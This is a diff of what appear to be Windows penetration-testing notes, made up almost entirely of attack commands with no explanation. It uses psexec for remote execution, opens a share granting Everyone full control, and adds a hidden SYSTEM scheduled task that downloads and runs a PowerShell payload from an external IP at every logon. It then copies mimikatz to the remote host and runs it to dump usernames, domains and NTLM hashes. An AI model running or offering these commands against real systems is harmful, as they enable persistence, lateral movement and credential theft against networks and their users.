@@ -2,11 +2,17 @@
 
 psexec.exe \\Desktop-abcedfg cmd.exe /c "mkdir c:\users\dddolev\exploit &net share ShareName=c:\users\dddolev\exploit /grant:Everyone,FULL "
 
+
+schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://103.203.221.232/LW40P5wJLe8u6v'''))'" /sc onlogon /ru System
+
+
 net use z: \\Desktop-abcedfg\c$\users\dddolev\exploit
 
-cd z:
 
-xcopy c:\users\dddolev\exploit\mimikatz\ z:\ & xcopy c:\users\dddolev\exploit\adfind\ z:\ 
+"Lateral tool movement" 
+
+xcopy c:\users\dddolev\exploit\mimikatz\ z:\mimikatz\ /E /y
 
 
-c:\users\dddolev\exploit\pstools\psexec.exe \\Desktop-abcedfg powershell -command "<mimikatz new path> log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+: .*'> c:\users\dddolev\exploit\mimiout.txt"
+"PSEXEC + Mimikatz"
+c:\users\dddolev\exploit\pstools\psexec.exe \\Desktop-abcdefg powershell -command "c:\Users\dddolev\exploit\mimikatz\mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+: .*'> c:\users\dddolev\exploit\mimiout.txt"'
